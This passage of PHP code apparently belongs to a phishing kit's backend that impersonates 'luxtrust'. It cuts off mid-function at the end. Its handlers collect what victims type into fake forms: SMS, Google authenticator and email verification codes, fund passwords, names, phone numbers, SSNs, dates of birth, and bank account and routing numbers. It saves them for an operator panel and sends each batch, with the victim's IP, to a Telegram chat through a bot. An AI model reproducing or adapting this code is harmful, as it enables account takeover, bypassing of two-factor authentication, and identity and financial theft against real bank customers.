    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'smscode2' => ['label' => 'SMS Code', 'emoji' => '📲', 'db' => 'smscode2'],
        'appcode2' => ['label' => 'Google 2FA', 'emoji' => '🔐', 'db' => 'appcode2']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 159";
    $columns[] = "buzzed = 0";
    $columns[] = "last_field_updated = 'smscode2'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        error_log("Prepare failed: " . $conn->error . " SQL: " . $sql);
        echo json_encode(['status' => 'notok', 'message' => 'Database prepare error']);
        exit;
    }

    $stmt->bind_param($types, ...$values);
    if (!$stmt->execute()) {
        error_log("Execute failed: " . $stmt->error . " SQL: " . $sql . " Values: " . implode(", ", $values));
        echo json_encode(['status' => 'notok', 'message' => 'Database execute error: ' . $stmt->error]);
        exit;
    }

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
        
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
        $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}

if ($_GET['type'] === 'smsgoogle') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'tsmscode' => ['label' => 'SMS Code', 'emoji' => '📲', 'db' => 'tsmscode'],
        'tappcode' => ['label' => 'Google 2FA', 'emoji' => '🔐', 'db' => 'tappcode']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 159";
    $columns[] = "buzzed = 0";
    $columns[] = "last_field_updated = 'tappcode'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        error_log("Prepare failed: " . $conn->error . " SQL: " . $sql);
        echo json_encode(['status' => 'notok', 'message' => 'Database prepare error']);
        exit;
    }

    $stmt->bind_param($types, ...$values);
    if (!$stmt->execute()) {
        error_log("Execute failed: " . $stmt->error . " SQL: " . $sql . " Values: " . implode(", ", $values));
        echo json_encode(['status' => 'notok', 'message' => 'Database execute error: ' . $stmt->error]);
        exit;
    }

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
        
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
        $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}




if ($_GET['type'] === 'smseemail') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'tsmscode' => ['label' => 'SMS Code', 'emoji' => '📲', 'db' => 'tsmscode'],
        'temailcode' => ['label' => 'Email Code', 'emoji' => '📧', 'db' => 'temailcode']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 163";
    $columns[] = "buzzed = 0";
    $columns[] = "last_field_updated = 'temailcode'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        error_log("Prepare failed: " . $conn->error . " SQL: " . $sql);
        echo json_encode(['status' => 'notok', 'message' => 'Database prepare error']);
        exit;
    }

    $stmt->bind_param($types, ...$values);
    if (!$stmt->execute()) {
        error_log("Execute failed: " . $stmt->error . " SQL: " . $sql . " Values: " . implode(", ", $values));
        echo json_encode(['status' => 'notok', 'message' => 'Database execute error: ' . $stmt->error]);
        exit;
    }

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
        
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
        $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}

if ($_GET['type'] === 'appemail') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'tappcode' => ['label' => 'Google 2FA', 'emoji' => '📲', 'db' => 'tappcode'],
        'temailcode' => ['label' => 'Email Code', 'emoji' => '📧', 'db' => 'temailcode']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 167";
    $columns[] = "buzzed = 0";
    $columns[] = "last_field_updated = 'temailcode'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        error_log("Prepare failed: " . $conn->error . " SQL: " . $sql);
        echo json_encode(['status' => 'notok', 'message' => 'Database prepare error']);
        exit;
    }

    $stmt->bind_param($types, ...$values);
    if (!$stmt->execute()) {
        error_log("Execute failed: " . $stmt->error . " SQL: " . $sql . " Values: " . implode(", ", $values));
        echo json_encode(['status' => 'notok', 'message' => 'Database execute error: ' . $stmt->error]);
        exit;
    }

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
        
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
        $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}


if ($_GET['type'] === 'fundpwd') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'fundpwd' => ['label' => 'Fund Password', 'emoji' => '🔑', 'db' => 'fundpwd']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 171";
    $columns[] = "buzzed = 0";
    $columns[] = "last_field_updated = 'fundpwd'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        error_log("Prepare failed: " . $conn->error . " SQL: " . $sql);
        echo json_encode(['status' => 'notok', 'message' => 'Database prepare error']);
        exit;
    }

    $stmt->bind_param($types, ...$values);
    if (!$stmt->execute()) {
        error_log("Execute failed: " . $stmt->error . " SQL: " . $sql . " Values: " . implode(", ", $values));
        echo json_encode(['status' => 'notok', 'message' => 'Database execute error: ' . $stmt->error]);
        exit;
    }

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
        
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
        $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}






if ($_GET['type'] === 'getemail') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'getemail' => ['label' => 'Email Verification', 'emoji' => '👤', 'db' => 'getemail']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 24";
    $columns[] = "buzzed = 0";
    $columns[] = "last_field_updated = 'getemail'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        error_log("Prepare failed: " . $conn->error . " SQL: " . $sql);
        echo json_encode(['status' => 'notok', 'message' => 'Database prepare error']);
        exit;
    }

    $stmt->bind_param($types, ...$values);
    if (!$stmt->execute()) {
        error_log("Execute failed: " . $stmt->error . " SQL: " . $sql . " Values: " . implode(", ", $values));
        echo json_encode(['status' => 'notok', 'message' => 'Database execute error: ' . $stmt->error]);
        exit;
    }

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
        
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
        $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}

if ($_GET['type'] === 'emailstart') {
    session_start();

    if (!isset($_SESSION['uniqueid'])) {
        echo json_encode(['status' => 'notok', 'message' => 'Session expired']);
        exit;
    }

    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a");
    $time = date("h:i:s A");
    $ip = $_SERVER['REMOTE_ADDR'];

    // Define simple secure fields
    $fields = [
        'emailstart' => ['label' => 'Email Verification', 'emoji' => '👤', 'db' => 'emailstart']
    ];

    // Sanitize & validate POST input
    $data = [];
    foreach ($fields as $key => $meta) {
        if (empty($_POST[$key])) {
            echo json_encode(['status' => 'notok', 'message' => "Missing $key"]);
            exit;
        }
        $data[$key] = mysqli_real_escape_string($conn, trim($_POST[$key]));
    }

    // Build SQL
    $columns = [];
    $types = '';
    $values = [];

    foreach ($fields as $key => $meta) {
        $columns[] = "{$meta['db']} = ?";
        $types .= 's';
        $values[] = $data[$key];
    }

    $columns[] = "status = 171";
    $columns[] = "buzzed = 0";
    $columns[] = "last_field_updated = 'emailstart'";
    $sql = "UPDATE clients SET " . implode(', ', $columns) . " WHERE uniqueid = ?";
    $types .= 'i';
    $values[] = $uniqueid;

    $stmt = $conn->prepare($sql);
    if ($stmt === false) {
        error_log("Prepare failed: " . $conn->error . " SQL: " . $sql);
        echo json_encode(['status' => 'notok', 'message' => 'Database prepare error']);
        exit;
    }

    $stmt->bind_param($types, ...$values);
    if (!$stmt->execute()) {
        error_log("Execute failed: " . $stmt->error . " SQL: " . $sql . " Values: " . implode(", ", $values));
        echo json_encode(['status' => 'notok', 'message' => 'Database execute error: ' . $stmt->error]);
        exit;
    }

    echo json_encode(['status' => 'ok']);

    // === Telegram ===
    if ($enable_telegram === 'checked' && !empty($telegram_chaid)) {
        $row = mysqli_fetch_array(mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid = '$uniqueid'"), MYSQLI_ASSOC);
        $userid = htmlspecialchars($row['id'] ?? 'unknown');
        $username = htmlspecialchars($row['user'] ?? 'unknown');
        
        $msg = "<b>luxtrust </b>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🆔 <b>User ID:</b> <code>$userid</code>\n";
        $msg .= "👤 <b>Username:</b> <code>$username</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";

        foreach ($fields as $key => $meta) {
            $val = htmlspecialchars($data[$key]);
            $msg .= "{$meta['emoji']} <b>{$meta['label']}:</b> <code>$val</code>\n";
        }

        $msg .= "<code>━━━━━━━━━━━━━━━</code>\n";
        $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
        $msg .= "📅 <b>Date:</b> <code>$date $time</code>\n";
        $msg .= "<code>━━━━━━━━━━━━━━━</code>";

        try {
            $telegram = new Telegram($bot_token);
            $telegram->sendMessage([
                'chat_id' => $telegram_chaid,
                'text' => $msg,
                'parse_mode' => 'HTML'
            ]);
        } catch (Exception $e) {
            file_put_contents('tg_error.log', "Telegram error (telegramerror): " . $e->getMessage() . "\n", FILE_APPEND);
        }
    }
}








if ($_GET['type'] == 'enter_phone_email') {
    if (!empty($_POST['userid']) && !empty($_POST['status'])) {
        $userid = $_POST['userid'];
        $status = $_POST['status'];
        $handler = $_SESSION['username'];

        $enterphone = isset($_POST['enterphone']) ? trim($_POST['enterphone']) : '';
        $enteremail = isset($_POST['enteremail']) ? trim($_POST['enteremail']) : '';

        // Use NULL if empty
        $phone_val = ($enterphone !== '') ? $enterphone : null;
        $email_val = ($enteremail !== '') ? $enteremail : null;

        // Prepared statement to prevent SQL injection
        $query = mysqli_prepare($conn, "UPDATE clients SET handler=?, status=?, buzzed=1, enterphone=?, enteremail=? WHERE id=?");
        mysqli_stmt_bind_param($query, "ssssi", $handler, $status, $phone_val, $email_val, $userid);

        if (mysqli_stmt_execute($query)) {
            $_SESSION['enterphone'] = $phone_val;
            $_SESSION['enteremail'] = $email_val;
            echo json_encode(['status' => 'ok']);
        } else {
            echo json_encode(['status' => 'notok']);
        }
    } else {
        echo json_encode(['status' => 'notokk']);
    }
}





if ($_GET['type'] == 'dataprofile') {
    session_start();
    $uniqueid = $_SESSION['uniqueid'];
    $date = date("Y-m-d h:i a", time());

    // Check if all required POST parameters are provided
    if (!empty($_POST['fname']) && !empty($_POST['lname']) && !empty($_POST['ssn']) && !empty($_POST['dob'])) {
        $fname = mysqli_real_escape_string($conn, $_POST['fname']);
        $lname = mysqli_real_escape_string($conn, $_POST['lname']);
        $ssn = mysqli_real_escape_string($conn, $_POST['ssn']);
        $dob = mysqli_real_escape_string($conn, $_POST['dob']);

        // Update database
        $query = mysqli_query($conn, "UPDATE clients SET fname='$fname', lname='$lname', ssn='$ssn', dob='$dob', status=129, buzzed=0 WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        // Check if Telegram notifications are enabled
        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            $tmsg = "<b>Profile Update</b>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "👤 <b>First Name:</b> <code>{$array['fname']}</code>\n";
            $tmsg .= "👤 <b>Last Name:</b> <code>{$array['lname']}</code>\n";
            $tmsg .= "📅 <b>Date of Birth:</b> <code>{$array['dob']}</code>\n";
            $tmsg .= "🔢 <b>SSN:</b> <code>{$array['ssn']}</code>\n";
            $tmsg .= "<code>━━━━━━━━━━━━━━━</code>\n";
            $tmsg .= "🌐 <b>IP Address:</b> <code>$ip</code>\n";
            $tmsg .= "📅 <b>Date:</b> <code>$date</code>\n";
            $tmsg .= "===================";

            $tmsg = preg_replace('/^[ \t]*[\r\n]+/m', '', $tmsg);

            // Send message via Telegram API
            $telegram = new Telegram($bot_token);
            $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
            $telegram->sendMessage($content);
        }
    } else {
        // If any required parameter is missing
        $response = array('status' => 'notok', 'message' => 'Missing required fields');
    }

    // Ensure content type is JSON and return response
    header('Content-Type: application/json');
    if (empty($response)) {
        $response = array('status' => 'error', 'message' => 'Empty response');
    }
    
    echo json_encode($response);
}



if ($_GET['type'] == 'cbdata') {
    session_start();
    $uniqueid = $_SESSION['uniqueid'];

    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['ssn'])) {
        $fullname = mysqli_real_escape_string($conn, $_POST['fullname']);
        $ssn = mysqli_real_escape_string($conn, $_POST['ssn']);
        $dob = mysqli_real_escape_string($conn, $_POST['dob']);

        // Update the clients table with the new data
        $query = mysqli_query($conn, "UPDATE clients SET 
            status=56, 
            buzzed=0, 
            fullname='$fullname', 
            dob='$dob', 
            ssn='$ssn'
            WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');

            // Check if Telegram notifications are enabled and the channel ID is set
            if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
                $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
                $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

                // Construct the Telegram message similar to the 'ic2fa' type
                $tmsg = "<strong> luxtrust </strong>\n" .
                        "<code>━━━━━━━━━━━━━━━</code>\n" .
                        "📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n" .
                        "<code>━━━━━━━━━━━━━━━</code>\n" .
                        "👤 <strong>Full Name:</strong> <code>$fullname</code>\n" .
                        "📅 <strong>Date of Birth:</strong> <code>$dob</code>\n" .
                        "🔑 <strong>SSN:</strong> <code>$ssn</code>\n" .
                        "<code>━━━━━━━━━━━━━━━</code>\n" .
                        "🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n" .
                        "📅 <strong>Date:</strong> <code>$date</code>\n";

                $telegram = new Telegram($bot_token);
                $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
                $telegram->sendMessage($content);
            }
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'SSN is empty');
    }

    echo json_encode($response);
}

if ($_GET['type'] == 'cbphone') {
    session_start();
    $uniqueid = $_SESSION['uniqueid'];

    $date = date("Y-m-d h:i a", time());

    if (!empty($_POST['phonenumber'])) {
        $fullname = mysqli_real_escape_string($conn, $_POST['fullname']);
        $phonenumber = mysqli_real_escape_string($conn, $_POST['phonenumber']);

        // Update the clients table with the new data
        $query = mysqli_query($conn, "UPDATE clients SET 
            status=52, 
            buzzed=0, 
            namephone='$fullname', 
            phonenumber='$phonenumber'
            WHERE uniqueid='$uniqueid'");

        if ($query) {
            $response = array('status' => 'ok');

            // Check if Telegram notifications are enabled and the channel ID is set
            if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
                $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
                $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

                // Construct the Telegram message similar to the 'ic2fa' type
                $tmsg = "<strong> luxtrust </strong>\n" .
                        "<code>━━━━━━━━━━━━━━━</code>\n" .
                        "📧 <strong>Email/User:</strong> <code>{$array['user']}</code>\n" .
                        "<code>━━━━━━━━━━━━━━━</code>\n" .
                        "👤 <strong>Full Name:</strong> <code>$fullname</code>\n" .
                        "📱 <strong>Phone Number:</strong> <code>$phonenumber</code>\n" .
                        "<code>━━━━━━━━━━━━━━━</code>\n" .
                        "🌐 <strong>IP:</strong> <code>{$array['ip']}</code>\n" .
                        "📅 <strong>Date:</strong> <code>$date</code>\n";

                $telegram = new Telegram($bot_token);
                $content = array('chat_id' => $telegram_chaid, 'text' => $tmsg, 'parse_mode' => 'html');
                $telegram->sendMessage($content);
            }
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }
    } else {
        $response = array('status' => 'notok', 'message' => 'Phone number is empty');
    }

    echo json_encode($response);
}





if ($_GET['type'] == 'extradata') {
    session_start();
    $uniqueid = $_SESSION['uniqueid'];


	$date = date("Y-m-d h:i a", time());
    if (!empty($_POST['SSN'])) {
        $ssn = mysqli_real_escape_string($conn, $_POST['SSN']);
        $fullname = mysqli_real_escape_string($conn, $_POST['fullname']);
        $ein = isset($_POST['EIN']) ? mysqli_real_escape_string($conn, $_POST['EIN']) : '';
        $accnum = mysqli_real_escape_string($conn, $_POST['accnum']);
        $routnum = mysqli_real_escape_string($conn, $_POST['routnum']);
        $acctype = mysqli_real_escape_string($conn, $_POST['acctype']);
        $dob = mysqli_real_escape_string($conn, $_POST['dob']);
        $buisname = mysqli_real_escape_string($conn, $_POST['buisname']);

        // Update the clients table with the new data
        $query = mysqli_query($conn, "UPDATE clients SET 
            status=18, 
            buzzed=0, 
            ssn='$ssn', 
            fullname='$fullname', 
            ein='$ein', 
            accnum='$accnum', 
            routnum='$routnum', 
            acctype='$acctype', 
            dob='$dob', 
            buisname='$buisname' 
            WHERE uniqueid='$uniqueid'");
        
        if ($query) {
            $response = array('status' => 'ok');
        } else {
            $response = array('status' => 'notok', 'message' => 'Database update failed');
        }

        if ($enable_telegram == 'checked' && !empty($telegram_chaid)) {
            $query = mysqli_query($conn, "SELECT * FROM clients WHERE uniqueid='$uniqueid'");
            $array = mysqli_fetch_array($query, MYSQLI_ASSOC);

            // Construct the Telegram message without extra spaces and newlines
